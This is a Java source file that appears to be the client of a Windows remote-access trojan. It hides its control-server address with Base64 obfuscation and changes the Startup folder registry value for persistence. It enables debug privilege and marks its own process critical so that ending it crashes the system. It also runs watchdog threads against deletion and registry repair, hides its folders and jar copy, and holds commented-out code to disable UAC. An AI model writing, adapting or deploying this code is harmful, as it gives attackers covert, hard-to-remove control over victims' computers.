package client;

import client.connection.HandleInbound;
import client.connection.ClientConnection;
import client.utils.check.CheckServerAlive;
import client.utils.check.DeleteFileChecker;
import client.utils.check.RegChecker;
import client.utils.check.ShutdownChecker;
import client.utils.dll.LoadNtdll;
import client.utils.file.Copy;
import client.utils.file.JarUtil;
import client.utils.system.UUIDGenerator;
import com.sun.jna.platform.win32.*;

import javax.swing.*;
import java.io.*;
import java.nio.channels.FileChannel;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.util.Base64;

import static com.sun.jna.platform.win32.WinNT.*;


public class ClientMain {
    private static final String serverAddress = "Y29udHJvbC54bi0";
    public static String fileMD5 = "NMSLxsYmFyLmN7";
    private static final int serverPort = 2035;
    private static final String clientSystemVersion = getSystemVersion();
    private static final String clientName = System.getProperty("user.name");
    public static ClientConnection clientConnection;
    public static boolean relieve = false;

    public static String otherPath;
    public static String path;
    static {
        try {
            otherPath = getOtherPath();
            path = getPath();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static void main(String[] args) {
        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup", "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        try {
//            VMChecker.check();
            UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
            elevatePrivilege();
            enableSEDebugNamePrivilege();
//            register();
//            lock();
            LoadNtdll.instance.RtlSetProcessIsCritical(new BOOL(true), null, new BOOL(false));
            new ShutdownChecker().start();
            new DeleteFileChecker().start();
            new RegChecker().start();
            connect();
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static void elevatePrivilege() {
        WinNT.HANDLEByReference hToken = new WinNT.HANDLEByReference();
        boolean result = Advapi32.INSTANCE.OpenProcessToken(
                Kernel32.INSTANCE.GetCurrentProcess(),
                WinNT.TOKEN_ADJUST_PRIVILEGES | WinNT.TOKEN_QUERY,
                hToken
        );

        if (!result) {
            return;
        }

        WinNT.LUID luid = new WinNT.LUID();
        result = Advapi32.INSTANCE.LookupPrivilegeValue(null, WinNT.SE_DEBUG_NAME, luid);

        if (!result) {
            Kernel32.INSTANCE.CloseHandle(hToken.getValue());
            return;
        }

        WinNT.TOKEN_PRIVILEGES tp = new WinNT.TOKEN_PRIVILEGES(1);
        tp.Privileges[0] = new WinNT.LUID_AND_ATTRIBUTES(luid, new WinNT.DWORD(WinNT.SE_PRIVILEGE_ENABLED));
        Advapi32.INSTANCE.AdjustTokenPrivileges(
                hToken.getValue(),
                false,
                tp,
                0,
                null,
                null
        );

        // Close the token handle
        Kernel32.INSTANCE.CloseHandle(hToken.getValue());

    }

    public static void enableSEDebugNamePrivilege() {
        WinNT.LUID luid = getLuidForPrivilege(WinNT.SE_DEBUG_NAME);

        WinNT.HANDLEByReference processToken = new WinNT.HANDLEByReference();
        if (Advapi32.INSTANCE.OpenProcessToken(Kernel32.INSTANCE.GetCurrentProcess(), WinNT.TOKEN_ADJUST_PRIVILEGES | WinNT.TOKEN_QUERY, processToken)) {
            try {
                enablePrivilege(processToken.getValue(), luid);
            } finally {
                Kernel32.INSTANCE.CloseHandle(processToken.getValue());
            }
        } else {
            // Handle error opening process token
        }
    }

    private static WinNT.LUID getLuidForPrivilege(String privilegeName) {
        WinNT.LUID luid = new WinNT.LUID();
        if (!Advapi32.INSTANCE.LookupPrivilegeValue(null, privilegeName, luid)) {
            // Handle error looking up privilege value
        }
        return luid;
    }

    private static void enablePrivilege(WinNT.HANDLE processToken, WinNT.LUID luid) {
        WinNT.TOKEN_PRIVILEGES tp = new WinNT.TOKEN_PRIVILEGES(1);
        tp.PrivilegeCount = new WinDef.DWORD(1);
        tp.Privileges[0] = new WinNT.LUID_AND_ATTRIBUTES(luid, new WinDef.DWORD(WinNT.SE_PRIVILEGE_ENABLED));

        if (!Advapi32.INSTANCE.AdjustTokenPrivileges(processToken, false, tp, tp.size(), null, null)) {
            // Handle error adjusting token privileges
        }
    }


    public static void connect() throws InterruptedException {
        Thread.sleep(200);
        System.gc();
        try {
            clientConnection = new ClientConnection("localhost", serverPort, clientSystemVersion, clientName);

            // Your client-side logic goes here
            new CheckServerAlive(clientConnection).start();
            new HandleInbound(clientConnection).start();
        } catch (Exception e) {
            clientConnection.reconnect();
        }
    }

    public static String getServerIP() {
        return getHostname(serverAddress.replace("0","0tdmpxdD7wYmlrMWIueHl6").replace("7","U"));
    }

    private static String getHostname(String obfuscatedHostname) {
        byte[] decodedBytes = Base64.getDecoder().decode(obfuscatedHostname);
        return new String(decodedBytes);
    }

    public static String getSystemVersion() {
        return System.getProperty("os.version");
    }

    public static String getPath() throws IOException {
        File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Roaming" + "\\Windows");
        if(!file.exists()) {
            file.mkdirs();
            Runtime.getRuntime().exec("attrib " + file.getAbsolutePath() + " +H");//隐藏文件夹
        }
        return file.getPath();
    }

    public static String getOtherPath() throws IOException {
        File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Local" + "\\Temp" + "\\{" + UUIDGenerator.generateUUID() + "}");
        if(!file.exists()) {
            file.mkdirs();
            Runtime.getRuntime().exec("attrib " + file.getAbsolutePath() + " +H");//隐藏文件夹
        }
        return file.getPath();
    }

    public static void register() {
        if(relieve)
            return;
        File file = new File(otherPath+"\\"+UUIDGenerator.generateUUID()+".jar");
        if(!file.exists()) {
            JarUtil jarUtil = new JarUtil(ClientMain.class);
            String path = jarUtil.getJarPath();
            path += "\\" + jarUtil.getJarName();
            Copy copy = new Copy(path);
            copy.copy();
            fileMD5 = calculateMD5(file);
            WinDef.DWORD dword = new WinDef.DWORD(WinNT.FILE_ATTRIBUTE_HIDDEN | WinNT.FILE_ATTRIBUTE_SYSTEM | 0x00000001);
            Kernel32.INSTANCE.SetFileAttributes(path,dword);
            Kernel32.INSTANCE.SetFileAttributes(otherPath,dword);
            try {

//                Advapi32Util.registrySetIntValue(WinReg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0x00000000);
            } catch (Exception ignored) {}
        }

    }

    public static void relieve() {
        relieve = true;
        clientConnection.close();
        try {
//            Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup","");
//            Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000001);
        }catch (Exception ignored){}
        LoadNtdll.instance.RtlSetProcessIsCritical(new BOOL(false),null,new BOOL(false));
        File otherFile = new File(otherPath + "\\" +UUIDGenerator.generateUUID()+ ".jar");
        otherFile.delete();
        System.exit(0);
    }

    public static void lock() {
        try {
            File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Roaming"  + "\\system.lock");
            Runtime.getRuntime().exec("attrib " + file.getAbsolutePath() + " +H");
            file.deleteOnExit();
            file.createNewFile();
            RandomAccessFile randomAccessFile = new RandomAccessFile(file,"rw");
            FileChannel fileChannel = randomAccessFile.getChannel();
            fileChannel.tryLock();
        }catch (Exception ignored) {
        }
    }

    public static String calculateMD5(File file){
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            try (InputStream is = Files.newInputStream(file.toPath())) {
                byte[] buffer = new byte[8192];
                int read;
                while ((read = is.read(buffer)) > 0) {
                    md.update(buffer, 0, read);
                }
            }

            byte[] md5Bytes = md.digest();
            StringBuilder sb = new StringBuilder();
            for (byte md5Byte : md5Bytes) {
                sb.append(Integer.toString((md5Byte & 0xff) + 0x100, 16).substring(1));
            }
            return sb.toString();
        }catch (Exception e){
            return "null";
        }
    }


}
